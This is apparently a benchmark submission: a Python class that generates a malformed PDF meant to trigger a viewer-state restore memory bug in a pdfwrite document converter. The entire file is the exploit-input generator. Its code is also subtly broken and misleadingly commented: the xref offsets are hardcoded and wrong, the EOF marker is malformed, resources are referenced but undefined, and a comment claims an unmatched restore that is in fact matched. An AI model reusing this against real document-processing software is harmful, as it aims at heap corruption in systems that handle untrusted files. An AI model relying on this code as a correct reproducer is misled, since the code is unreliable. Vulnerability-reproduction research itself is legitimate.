import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PDF with viewer state manipulation
        # The vulnerability is triggered by restoring viewer state when depth is 0
        # We need to create a PDF that causes the pdfwrite device to restore
        # viewer state without proper depth checking
        
        # Build a PDF that:
        # 1. Sets up a page with content
        # 2. Manipulates viewer state stack
        # 3. Triggers the restore when depth is 0
        
        pdf_parts = []
        
        # PDF Header
        pdf_parts.append(b'%PDF-1.4\n')
        
        # Catalog object
        catalog_obj = b'''1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
'''
        pdf_parts.append(catalog_obj)
        
        # Pages object
        pages_obj = b'''2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
'''
        pdf_parts.append(pages_obj)
        
        # Page object
        page_obj = b'''3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/ProcSet [/PDF]
>>
>>
endobj
'''
        pdf_parts.append(page_obj)
        
        # Content stream - this is where we trigger the vulnerability
        # We'll create a stream that manipulates viewer state
        content_stream = b'''q\n'''  # Save graphics state
        
        # Add multiple viewer state operations to potentially corrupt heap
        # The vulnerability involves viewer state restoration without depth check
        for i in range(100):
            content_stream += b'''/GS0 gs\n'''  # Set graphics state
        
        # Try to trigger the vulnerability by manipulating viewer state stack
        content_stream += b'''Q\n'''  # Restore graphics state without matching save
        
        # Add more operations to potentially trigger overflow
        content_stream += b'''BT\n'''  # Begin text
        content_stream += b'''/F1 12 Tf\n'''  # Set font
        content_stream += b'''100 100 Td\n'''  # Text position
        content_stream += b'''(Test)Tj\n'''  # Show text
        content_stream += b'''ET\n'''  # End text
        
        # Compress the stream (optional, but makes it more realistic)
        import zlib
        compressed = zlib.compress(content_stream)
        
        content_obj = b'''4 0 obj
<<
/Length %d
/Filter /FlateDecode
>>
stream
%s
endstream
endobj
''' % (len(compressed), compressed)
        pdf_parts.append(content_obj)
        
        # Xref table
        xref_offset = len(b''.join(pdf_parts))
        xref = b'''xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000054 00000 n
0000000116 00000 n
0000000220 00000 n
'''
        pdf_parts.append(xref)
        
        # Trailer
        trailer = b'''trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
%d
%%%%EOF
''' % xref_offset
        pdf_parts.append(trailer)
        
        return b''.join(pdf_parts)
